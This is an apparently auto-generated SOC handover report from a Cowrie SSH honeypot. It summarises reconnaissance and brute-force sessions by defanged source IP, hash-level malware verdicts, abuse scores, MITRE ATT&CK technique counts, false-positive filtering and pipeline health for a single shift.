## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.197.33[.]109` | **220** | 2026-05-21 20:44 | 2026-05-21 21:43 | 136m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.124[.]126` | **15** | 2026-05-21 20:23 | 2026-05-21 20:27 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `152.52.15[.]214` | **10** | 2026-05-21 21:01 | 2026-05-21 21:39 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.248.207[.]139` | **10** | 2026-05-21 20:14 | 2026-05-21 20:54 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `160.153.175[.]11` | **9** | 2026-05-21 20:13 | 2026-05-21 21:42 | 4m | 0 | `T1592` | 🟢 LOW |
| `222.174.65[.]38` | **7** | 2026-05-21 21:24 | 2026-05-21 21:30 | 8m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.154[.]252` | **5** | 2026-05-21 20:38 | 2026-05-21 21:26 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.211.59[.]6` | **5** | 2026-05-21 20:03 | 2026-05-21 20:29 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `218.201.184[.]228` | **3** | 2026-05-21 21:23 | 2026-05-21 21:27 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `104.152.52[.]126` | **2** | 2026-05-21 21:03 | 2026-05-21 21:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.240.95[.]27` | 1 | 2026-05-21 20:36 | 2026-05-21 20:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `161.35.217[.]121` | 1 | 2026-05-21 21:02 | 2026-05-21 21:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.213.158[.]112` | 1 | 2026-05-21 21:16 | 2026-05-21 21:16 | 12s | 0 | `T1592` | 🟢 LOW |
| `74.87.117[.]149` | 1 | 2026-05-21 21:09 | 2026-05-21 21:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.197.33[.]109` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `160.153.175[.]11` | US | GoDaddy.com, LLC | **100** ⚠️ | 0 |
| `161.35.217[.]121` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `103.211.59[.]6` | IN | Precious netcom pvt ltd | **100** ⚠️ | 50 |
| `222.174.65[.]38` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 13 |
| `192.42.116[.]100` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `223.123.124[.]126` | PK | CMPak Limited | **100** ⚠️ | 3 |
| `218.201.184[.]228` | CN | China Mobile Communications Corporation - shandong | **100** ⚠️ | 7 |
| `104.152.52[.]126` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `74.87.117[.]149` | US | Charter Communications Inc | **100** ⚠️ | 19 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (61 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 18 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 378 cases |
| Tool 34  | Credential Extractor        | ✅ 61 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 61 filtered (16.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 14 recon entry/entries in table (10 group(s) consolidating 286 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-21T21:44:53Z_
